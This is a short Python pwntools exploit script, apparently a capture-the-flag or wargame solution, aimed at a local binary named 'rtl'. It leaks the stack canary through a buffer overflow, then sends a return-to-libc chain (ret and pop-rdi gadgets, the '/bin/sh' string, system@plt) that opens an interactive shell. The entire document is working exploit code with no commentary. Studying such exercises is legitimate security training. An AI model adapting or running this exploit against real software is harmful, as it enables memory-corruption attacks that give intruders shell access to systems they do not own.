from pwn import *

p = process('./rtl')
e = ELF('./rtl')
rop = ROP('./rtl')

#context.log_level = 'debug'

buf = b"A"*0x39

p.sendafter(b"Buf: ", buf);
p.recvuntil(buf)
cnry = u64(b'\x00' + p.recv(7))

print(hex(cnry))

buf = b"A"*0x38 + p64(cnry) + b"B"*0x8
buf += p64(rop.ret[0])
buf += p64(rop.rdi[0])
buf += p64(list(e.search(b"/bin/sh"))[0])
buf += p64(e.plt['system'])


p.sendafter(b"Buf: ", buf);

p.interactive()